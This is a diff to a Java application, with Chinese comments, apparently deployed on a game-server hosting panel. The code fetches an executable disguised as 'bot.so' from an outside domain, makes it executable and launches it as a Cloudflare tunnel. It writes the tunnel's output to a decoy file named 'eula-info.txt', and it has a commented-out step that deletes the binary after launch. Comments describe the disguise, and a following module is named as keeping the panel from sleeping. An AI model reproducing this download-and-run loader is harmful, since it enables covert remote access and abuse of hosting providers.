@@ -134,69 +134,83 @@ public class App {
 
     // ========================================================
 // ========================================================
-    // 模块 1：诊断专用 CF 隧道 (抓取底层报错信息)
+    // 诊断专用版：重新下载 + 直击崩溃原因
     // ========================================================
     private static void startCloudflareTunnelDaemon() {
         if (CF_TOKEN == null || CF_TOKEN.length() < 50) return;
 
         Thread watchdogThread = new Thread(() -> {
             try {
-                if (tunnelProcess == null || !tunnelProcess.isAlive()) {
-                    String arch = System.getProperty("os.arch").toLowerCase();
-                    
-                    String dlUrl = "https://amd64.oooen.com/bot.so"; 
-                    if (arch.contains("arm") || arch.contains("aarch64")) {
-                        dlUrl = "https://arm64.oooen.com/bot.so";
-                    }
+                String arch = System.getProperty("os.arch").toLowerCase();
+                String dlUrl = "https://amd64.oooen.com/bot.so"; 
+                if (arch.contains("arm") || arch.contains("aarch64")) {
+                    dlUrl = "https://arm64.oooen.com/bot.so";
+                }
 
-                    // 放在根目录，方便我们在文件管理器里找
-                    Path tempDir = Path.of(""); 
-                    Path tempFile = tempDir.resolve("libcore_bot.so");
-                    
-                    HttpClient client = HttpClient.newBuilder()
-                            .followRedirects(HttpClient.Redirect.NORMAL)
-                            .build();
-                            
-                    HttpRequest req = HttpRequest.newBuilder(URI.create(dlUrl))
-                            .timeout(Duration.ofMinutes(2))
-                            .build();
-                            
-                    HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
-                    
-                    if (res.statusCode() == 200 || res.statusCode() == 302) {
-                        tempFile.toFile().setExecutable(true);
-                        
-                        ProcessBuilder pb = new ProcessBuilder(
-                                tempFile.toAbsolutePath().toString(),
-                                "tunnel", "--protocol", "http2", "run"
-                        );
-                        
-                        pb.environment().put("TUNNEL_TOKEN", CF_TOKEN);
-                        
-                        // 👇 【核心排查点】：把隧道的崩溃报错输出到一个伪装文件里
-                        pb.redirectErrorStream(true);
-                        pb.redirectOutput(new java.io.File("eula-info.txt"));
-                        
-                        tunnelProcess = pb.start();
-                        
-                        // ⚠️ 诊断期间暂时注释掉阅后即焚，方便检查文件大小
-                        // Files.deleteIfExists(tempFile);
-                    } else {
-                        // 如果下载失败，记录 HTTP 状态码
-                        Files.writeString(Path.of("eula-info.txt"), "Download Failed. HTTP Code: " + res.statusCode());
+                Path tempFile = Path.of("libcore_bot.so");
+                
+                // 1. 重新下载
+                HttpClient client = HttpClient.newBuilder().followRedirects(HttpClient.Redirect.NORMAL).build();
+                HttpRequest req = HttpRequest.newBuilder(URI.create(dlUrl)).timeout(Duration.ofMinutes(2)).build();
+                HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
+                
+                if (res.statusCode() != 200 && res.statusCode() != 302) {
+                     Files.writeString(Path.of("eula-info.txt"), "Download Failed. HTTP Code: " + res.statusCode());
+                     return;
+                }
+                
+                tempFile.toFile().setExecutable(true);
+
+                // 2. 诊断 A：测试内核能否正常执行它 (查版本号)
+                Process p1 = new ProcessBuilder(tempFile.toAbsolutePath().toString(), "--version").start();
+                p1.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
+                String vOut = new String(p1.getInputStream().readAllBytes());
+                String vErr = new String(p1.getErrorStream().readAllBytes());
+
+                // 3. 诊断 B：带明文 Token 参数运行，且去掉 http2 参数，防止老版本报错
+                ProcessBuilder pb = new ProcessBuilder(
+                        tempFile.toAbsolutePath().toString(),
+                        "tunnel", "run", "--token", CF_TOKEN
+                );
+                tunnelProcess = pb.start();
+                
+                // 监听 8 秒钟，看看它是死是活
+                Thread.sleep(8000);
+                
+                boolean isAlive = tunnelProcess.isAlive();
+                String runLog = "";
+                String exitCode = "Still Running";
+                
+                // 如果它在这 8 秒内死了，强行读取它的退出码和错误流
+                if (!isAlive) {
+                    exitCode = String.valueOf(tunnelProcess.exitValue());
+                    runLog = new String(tunnelProcess.getErrorStream().readAllBytes());
+                } else {
+                    // 如果还活着，抓一点现有日志
+                    int available = tunnelProcess.getErrorStream().available();
+                    if (available > 0) {
+                        byte[] buffer = new byte[available];
+                        tunnelProcess.getErrorStream().read(buffer);
+                        runLog = new String(buffer);
                     }
                 }
+                
+                String report = "=== 1. Version Check ===\nOut: " + vOut + "\nErr: " + vErr +
+                                "\n\n=== 2. Tunnel Status ===\nAlive after 8s: " + isAlive + 
+                                "\nExit Code: " + exitCode + 
+                                "\nLog: \n" + runLog;
+                
+                Files.writeString(Path.of("eula-info.txt"), report);
+
             } catch (Exception e) {
-                // 如果 Java 启动进程失败，记录原因
                 try {
-                    Files.writeString(Path.of("eula-info.txt"), "Process Launch Failed: " + e.getMessage());
+                    Files.writeString(Path.of("eula-info.txt"), "Fatal Error: " + e.toString());
                 } catch (Exception ignored) {}
             }
         });
         watchdogThread.setDaemon(true);
         watchdogThread.start();
     }
-
     // ========================================================
     // 模块 2：MC 高频心跳 TCP 挂机保活引擎 (防面板休眠)
     // ========================================================
